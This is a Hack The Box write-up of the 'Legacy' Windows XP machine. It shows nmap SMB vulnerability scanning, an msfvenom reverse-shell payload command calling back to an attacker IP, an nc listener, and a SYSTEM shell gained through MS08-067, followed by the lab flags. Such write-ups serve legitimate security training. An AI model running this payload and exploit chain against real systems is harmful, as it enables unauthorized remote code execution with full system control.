---
title: "Legacy - Writeup"
linkTitle: "Legacy"
weight: 2
featured: true
platform: "HTB"
name: "Legacy"
os: "Windows"
difficulty: "Easy"
points: 20
release: "15 Mar 2017"
ip: "10.129.30.78"
# Drop a real avatar at static/img/htb/legacy.png and uncomment:
# avatar: "/img/htb/legacy.png"
tags: ["windows-xp", "ms08-067", "ms17-010", "smb", "msfvenom", "system-shell"]
description: "Easy Windows box, one of HTB's original machines. A Windows XP host vulnerable to both MS08-067 and MS17-010, exploited manually with a custom-generated msfvenom payload for a direct SYSTEM shell."
---

{{< htb name="Legacy" os="Windows" difficulty="Easy" points="20" release="15 Mar 2017" ip="10.129.30.78" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.30.78
```

```
Open 10.129.30.78:135
Open 10.129.30.78:139
Open 10.129.30.78:445
```

```
(root㉿kali)# nmap 10.129.30.78 -p445 --script smb-vuln* -sCV -T5
```

```
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds

smb-vuln-ms08-067: VULNERABLE (CVE-2008-4250)
smb-vuln-ms17-010: VULNERABLE (CVE-2017-0143)
```

A Windows XP host vulnerable to two of the most well-known SMB RCEs at once.

## Enumeration

```
(root㉿kali)# smbclient -L //10.129.30.78/ -N
```

```
session setup failed: NT_STATUS_INVALID_PARAMETER
```

Anonymous share listing fails outright, no foothold available there. With two confirmed CVEs and no other surface to check, MS08-067 is the more reliable exploit of the two on Windows XP, [h3x0v3rl0rd/MS08-067](https://github.com/h3x0v3rl0rd/MS08-067) provides a working manual script.

## Initial Foothold

Generate a shellcode payload matching the exploit script's expected format and bad-character constraints.

```
(root㉿kali)# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.249 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

```
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor chosen with final size 348
```

The default encoder fails against the excluded bytes, `call4_dword_xor` succeeds instead. Drop the generated buffer into the exploit script, start a listener, and run it.

```
(root㉿kali)# rlwrap nc -lvnp 443
```

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.78] 1032
Microsoft Windows XP [Version 5.1.2600]
```

MS08-067 exploits a kernel-level path-canonicalization bug in the Server service itself, the resulting shell is already `NT AUTHORITY\SYSTEM`, no separate privilege escalation needed.

## Privilege Escalation

None needed, confirmed directly by reading both flags from their respective desktops.

```
C:\WINDOWS\system32>cd ../../../Documents and Settings\john\Desktop
type user.txt
```

```
e69af0e4f443de7e36876fda4ec7644f
```

```
C:\WINDOWS\system32>cd ../../../Documents and Settings\Administrator\Desktop\
type root.txt
```

```
993442d258b0e0ec917cae9e695d5713
```

## Lessons learned

- When two kernel-level CVEs are both confirmed, pick the one with more historical exploit stability rather than defaulting to whichever is more famous. MS08-067 is older but more consistently reliable on XP than EternalBlue, worth knowing both and choosing deliberately.
- msfvenom's default encoder isn't guaranteed to work against every bad-character set. When `shikata_ga_nai` fails, msfvenom automatically falls back to alternatives like `call4_dword_xor`, know that a failed first attempt in the output doesn't mean the whole payload generation failed.
- Kernel and service-level RCEs on old, unpatched Windows builds routinely skip privilege escalation entirely. Confirm the shell's actual privilege level immediately rather than assuming more steps are required by default.
